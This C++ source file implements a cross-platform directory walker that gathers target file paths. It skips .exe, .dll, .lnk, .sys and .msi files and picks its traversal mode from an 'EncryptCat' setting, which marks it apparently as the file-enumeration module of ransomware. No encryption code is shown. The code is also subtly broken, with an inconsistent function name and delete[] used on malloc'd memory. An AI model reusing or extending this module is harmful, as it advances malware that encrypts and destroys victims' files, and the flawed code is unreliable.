#ifdef _WIN32
#include <Windows.h>
#else
#include <cstring>
#include <dirent.h>
#include <sys/types.h>
#include <sys/stat.h>
#endif

#include <stdio.h>
#include <memory>
#include <string>

#include "pathsystem.h"
#include "filesystem.h"
#include "global_parameters.h"
#include "memory.h"
#include "logs.h"


bool PathSystem::check_filename(TCHAR* cFilename)
{
    CONST TCHAR* BlackList[]
    {
        T(".exe"),
        T(".dll"),
        T(".lnk"),
        T(".sys"),
        T(".msi")
    };

    size_t len = memory::StrLen(cFilename);
    if (len == 0) return true;
    int i = static_cast<int>(len) - 1;
    for (; i >= 0; --i)
    {
        if (cFilename[i] == T('.'))
            break;
    }

    if (i < 0)
        return true;

    for (int k = 0; k < 5; ++k)
    {
        if (memory::StrStr(&cFilename[i], BlackList[k]))
            return false;
    }

    return true;
}

TCHAR* PathSystem::make_exst(TCHAR* Filename)
{
    size_t len = memory::StrLen(Filename);
    int j = 0;
    int i = static_cast<int>(len) - 1;
    for (; i >= 0; --i, ++j)
    {
        if (Filename[i] == T('.'))
        {
            ++j;
            break;
        }
    }

    if (i < 0)
    {
        TCHAR* empty = (TCHAR*)memory::m_malloc(Tsize);
        return empty;
    }

    TCHAR* exst = (TCHAR*)memory::m_malloc((j + 1) * sizeof(TCHAR));
    memc(exst, &Filename[i], j);
    return exst;
}

TCHAR* make_path(TCHAR* Filename, TCHAR* Directory)
{
    size_t dir_len = memory::StrLen(Directory);
    size_t file_len = memory::StrLen(Filename);
    TCHAR* str = (TCHAR*)memory::m_malloc((dir_len + file_len + 2) * Tsize);

    memc(str, Directory, dir_len);
    memc(&str[dir_len], slash, 1);
    memc(&str[dir_len + 1], Filename, file_len);
    return str;
}

#ifdef _WIN32
STATIC WCHAR* MakeSearchMask
(
    WCHAR* Directory,
    size_t DirLen
)
{
    std::wstring Path = Directory[DirLen - 1] == '/' ?
        std::wstring(Directory) + std::wstring(L"*") :
        std::wstring(Directory) + std::wstring(L"/*");
    size_t PathLen = Path.size() + 1;
    WCHAR* mask = (WCHAR*)malloc(PathLen * sizeof(WCHAR));
    if (!mask)
    {
        WCHAR* empty = (WCHAR*)memory::m_malloc(sizeof(WCHAR));
        return empty;
    }
    wmemcpy_s(mask, PathLen, Path.c_str(), PathLen);
    return mask;
}
#endif


void PathSystem::search_files(LIST<DIRECTORY_INFO>* DirectoryInfo, int* cf)
{
    if(directory == NULL || drive_info == NULL)
        LOG_INFO("null");
    size_t DirLen = memory::StrLen(directory);
    
#ifdef _WIN32
    WIN32_FIND_DATAW FindData;
    WCHAR* DirectoryMask = MakeSearchMask(directory, DirLen);

    HANDLE hSearchFile = FindFirstFileW(DirectoryMask, &FindData);
    if (hSearchFile == INVALID_HANDLE_VALUE)
    {
        printf_s("FindFirstFile fails in directory %ls. GetLastError = %lu.", directory, GetLastError());
        delete[] DirectoryMask;
        return;
    }

    do
    {
        if (!lstrcmpW(FindData.cFileName, L".") ||
            !lstrcmpW(FindData.cFileName, L"..") ||
            FindData.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT)
        {
            continue;
        }
        if (FindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
        {
            PDIRECTORY_INFO DirectoryData = new DIRECTORY_INFO;
            DirectoryData->Directory = make_path(FindData.cFileName, directory);
            DirectoryInfo->LIST_INSERT_HEAD(DirectoryData);
        }
        else if (CheckFilename(FindData.cFileName))
        {
            WCHAR* cFilename = (WCHAR*)memory::m_malloc(260 * sizeof(WCHAR));
            wmemcpy_s(cFilename, 260, FindData.cFileName, 260);
            PDRIVE_INFO DriveData = new DRIVE_INFO;
            {
                DriveData->Filename = cFilename;
                DriveData->Exst = make_exst(cFilename);
                DriveData->FullPath = make_path(cFilename, directory);
                WCHAR* Dir = (WCHAR*)memory::m_malloc((DirLen + 1) * sizeof(WCHAR));
                wmemcpy_s(Dir, DirLen + 1, directory, DirLen + 1);
                DriveData->Path = Dir;
            }
            drive_info->LIST_INSERT_HEAD(DriveData);
            ++*cf;
        }

    } while (FindNextFileW(hSearchFile, &FindData));
    FindClose(hSearchFile);
    delete[] DirectoryMask;
#else
    struct dirent* entry;
    DIR* dp = opendir(directory);
    if (dp == NULL)
    {
        LOG_ERROR("[SearchFiles] [opendir] Failed; %s", directory);
        return;
    }
 

    while ((entry = readdir(dp)) != NULL)
    {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;

        CHAR full_path[4096];
        snprintf(full_path, sizeof(full_path), "%s/%s", directory, entry->d_name);

        struct stat statbuf;
        if (stat(full_path, &statbuf) == -1)
        { LOG_ERROR("[SEARCH_FILES] failed stat"); continue; }

        if (S_ISDIR(statbuf.st_mode))
        {
            PDIRECTORY_INFO DirectoryData = new DIRECTORY_INFO;
            DirectoryData->Directory = make_path(entry->d_name, directory);
            DirectoryInfo->LIST_INSERT_HEAD(DirectoryData);
        }
        else if (S_ISREG(statbuf.st_mode) && check_filename(entry->d_name))
        {
            CHAR* cFilename = (CHAR*)memory::m_malloc(260);
            memcpy(cFilename, entry->d_name, 260);
            PDRIVE_INFO DriveData = new DRIVE_INFO;
            {
                DriveData->Filename = cFilename;
                DriveData->Exst = make_exst(cFilename);
                DriveData->FullPath = make_path(cFilename, directory);
                CHAR* Dir = (CHAR*)memory::m_malloc((DirLen + 1));
                memcpy(Dir, directory, DirLen + 1);
                DriveData->Path = Dir;
            }
            drive_info->LIST_INSERT_HEAD(DriveData);
            ++*cf;
        }
    }

    closedir(dp);
#endif
}

size_t PathSystem::start_local_search()
{
    if(directory == NULL || drive_info == NULL)
        return 0;

    if (GLOBAL_ENUM.g_EncryptCat == EncryptCatalog::FILE_CAT)
    {
        TCHAR* name = NULL;
        TCHAR* path = NULL;
        size_t ld = memory::StrLen(directory);
        for (int i = ld - 1, j = 0; i >= 0; --i, ++j)
        {
            if (directory[i] == T('/') || directory[i] == T('\\'))
            {
                name = (TCHAR*)memory::m_malloc((j + 1) * Tsize);
                memc(name, &directory[i + 1], j);

                path = (TCHAR*)memory::m_malloc((i + 1) * Tsize);
                memc(path, directory, i);

                break;
            }
        }

        PDRIVE_INFO DriveData = new DRIVE_INFO;
        if (name)
            DriveData->Filename = name;
        if (path)
            DriveData->Path = path;
        TCHAR* fpath = (TCHAR*)memory::m_malloc((ld + 1) * Tsize);
        memc(fpath, directory, ld);
        DriveData->FullPath = fpath;
        DriveData->Exst = make_exst(directory);
        drive_info->LIST_INSERT_HEAD(DriveData);

        return 1;
    }
    
    directory_info = new LIST<DIRECTORY_INFO>;
    search_files(directory_info, &f_count);


    if (GLOBAL_ENUM.g_EncryptCat == EncryptCatalog::DIR_CAT)
    {

    }
    else if (GLOBAL_ENUM.g_EncryptCat  == EncryptCatalog::INDIR_CAT)
    {
        PDIRECTORY_INFO dirs = NULL;
        REV_LIST_FOREACH(dirs, directory_info)
        {
            directory = dirs->Directory;
            search_files(directory_info, &f_count);
        }
    }

    return f_count;
}

void PathSystem::free_drive_info()
{
    if (drive_info == NULL) return;
    LIST_FOREACH(data, drive_info)
    {
        memory::m_free(data->Exst);
        memory::m_free(data->Filename);
        memory::m_free(data->FullPath);
        memory::m_free(data->Path);
    }
}

void PathSystem::free_directory_info()
{
    if(directory_info == NULL) return;

    PDIRECTORY_INFO dir_ = NULL;
    LIST_FOREACH(dir_, directory_info)
    {
        LOG_INFO("DIRECTORIES: " log_str, dir_->Directory);
        memory::m_free(dir_->Directory);
    }
}

PathSystem::~PathSystem()
{  
    free_drive_info();
    free_directory_info();
    if(drive_info)     delete drive_info;
    if(directory_info) delete directory_info;

}